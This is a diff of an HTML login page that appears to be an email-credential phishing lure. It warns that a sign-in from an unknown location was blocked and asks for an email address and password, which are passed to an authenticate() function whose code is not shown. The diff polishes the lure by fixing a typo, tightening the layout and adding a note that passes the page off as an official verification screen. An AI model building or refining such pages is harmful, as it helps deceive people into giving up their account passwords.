@@ -41,7 +41,7 @@
       background-color: rgba(255, 255, 255, 0.65);
       backdrop-filter: blur(20px);
       width: 100%;
-      max-width: 400px;
+      max-width: 360px;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
@@ -67,9 +67,9 @@
     }
 
     .login-container input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
+      width: 90%;
+      padding: 10px;
+      margin-bottom: 12px;
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 14px;
@@ -83,7 +83,7 @@
     }
 
     .login-container button {
-      width: 100%;
+      width: 90%;
       padding: 12px;
       background-color: #007BFF;
       color: #fff;
@@ -93,10 +93,17 @@
       border-radius: 8px;
       cursor: pointer;
       transition: background 0.3s ease;
+      margin-bottom: 10px;
     }
 
     .login-container button:hover {
       background-color: #0056b3;
+    }
+
+    .login-container p.note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 5px;
     }
 
     /* Confirmation Message */
@@ -137,11 +144,12 @@
   <!-- Login Panel -->
   <div id="login" class="login-container">
     <img src="https://img.icons8.com/ios-filled/100/000000/new-post.png" alt="Email Icon">
-    <h2>Verify Anthentication</h2>
+    <h2>Verify Authentication</h2>
     <p class="subtext">We blocked a sign-in from an unknown location and denied access to your email account</p>
     <input type="email" id="email" placeholder="Email Address" required>
     <input type="password" id="password" placeholder="Password" required>
     <button onclick="authenticate()">Login</button>
+    <p class="note">The new verification screen in the web app during the login process for users without two-step login turned on.</p>
   </div>
 
   <!-- Confirmation Message -->
